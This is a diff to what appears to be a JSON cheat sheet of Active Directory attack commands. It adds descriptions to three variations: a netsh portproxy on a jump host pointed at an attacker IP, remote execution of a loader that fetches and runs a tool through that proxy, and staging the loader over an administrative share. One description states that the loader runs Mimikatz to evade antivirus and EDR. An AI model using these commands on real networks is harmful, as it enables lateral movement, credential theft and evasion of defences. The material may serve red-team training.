@@ -32,15 +32,18 @@
   "variations": [
     {
       "label": "Add a portproxy on the jump host (remote via winrs)",
-      "command": "winrs -r:<jump_host> netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<attacker_ip>"
+      "command": "winrs -r:<jump_host> netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<attacker_ip>",
+      "description": "Add a portproxy on the jump host (remote via winrs). See the command syntax for exact parameters and flags."
     },
     {
       "label": "Fetch + run a tool through the proxy on the deep host",
-      "command": "winrs -r:<deep_host> C:\\Users\\Public\\Loader.exe -path http://127.0.0.1:8080/<tool>.exe \"<args>\" \"exit\""
+      "command": "winrs -r:<deep_host> C:\\Users\\Public\\Loader.exe -path http://127.0.0.1:8080/<tool>.exe \"<args>\" \"exit\"",
+      "description": "Runs a Mimikatz operation through an evasive loader (e.g., SafetyKatz) to bypass antivirus and EDR detections that would flag direct Mimikatz execution."
     },
     {
       "label": "Stage the loader to the deep host first",
-      "command": "echo F | xcopy C:\\AD\\Tools\\Loader.exe \\\\<deep_host>\\C$\\Users\\Public\\Loader.exe /Y"
+      "command": "echo F | xcopy C:\\AD\\Tools\\Loader.exe \\\\<deep_host>\\C$\\Users\\Public\\Loader.exe /Y",
+      "description": "Stage the loader to the deep host first. See the command syntax for exact parameters and flags."
     }
   ],
   "steps": [
